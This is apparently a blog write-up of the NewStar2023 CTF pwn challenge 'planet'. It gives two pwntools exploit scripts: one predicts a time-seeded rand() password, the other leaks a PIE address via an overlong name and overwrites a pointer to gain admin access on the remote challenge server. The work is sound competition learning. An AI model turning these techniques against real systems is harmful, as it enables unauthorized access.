---
title: NewStar2023 pwn planet
tags: [ctf-pwn, random-leak]
date: 2023-11-26 12:08:00
categories: [ctf-pwn]
excerpt: planet
---

## planet

https://buuoj.cn/match/matches/190/challenges#planet

#### exp1 泄露随机数

```python
from pwn import *
from ctypes import *

context(arch='amd64', os='linux', log_level='debug')
#p = process('./pwn')
p=remote("node4.buuoj.cn",28513)
elf = ELF('putsorsys')

libc=cdll.LoadLibrary("/lib/x86_64-linux-gnu/libc.so.6")

p.recvuntil(b"Passwd: ")
p.sendline(b"secret_passwd_anti_bad_guys")

seed=libc.time(0)
libc.srand(seed)
p.recvuntil(b">")
p.sendline(b"Admin")

for i in range(55):
    libc.rand()

passwd = ''
alpha = 'abcdefghijklmnopqrstuvwxyz'
for i in range(30):
	passwd = passwd + alpha[libc.rand() % 26]

p.sendline(passwd.encode())
p.interactive()
```

#### exp2 泄露PIE

让字母表全变成A，不管怎么随机都是一样的

```python
from pwn import *
from ctypes import *

context(arch='amd64', os='linux', log_level='debug')
#p = process('./pwn')
p=remote("node4.buuoj.cn",28513)
elf = ELF('putsorsys')

p.recvuntil(b"Passwd: ")
p.sendline(b"secret_passwd_anti_bad_guys")

p.recvuntil(b">")
p.sendline("Rename")
p.recvuntil(b"Enter the new name")
p.sendline(b"A" * 16)

p.recvuntil(b">")
p.sendline("GetName")
p.recvuntil(b"A" * 16)
s = u64(p.recvuntil(b"\n")[:-1].ljust(8,b'\0'))
print(hex(s))

PIE = s - 0x40D0

p.recvuntil(b">")
p.sendline(b"Rename")
p.recvuntil(b"Enter the new name")
p.sendline(b"A" * 24 + p64(PIE + 0x40E0))

p.recvuntil(b">")
p.sendline("Jump")

p.recvuntil(b">")
p.sendline(b"Rename")
p.recvuntil(b"Enter the new name")
p.sendline(b"A" * 26)

p.recvuntil(b">")
p.sendline(b"Admin")
p.recvuntil(b">")
p.sendline(b"A" * 30)
p.interactive()
p.interactive()
```

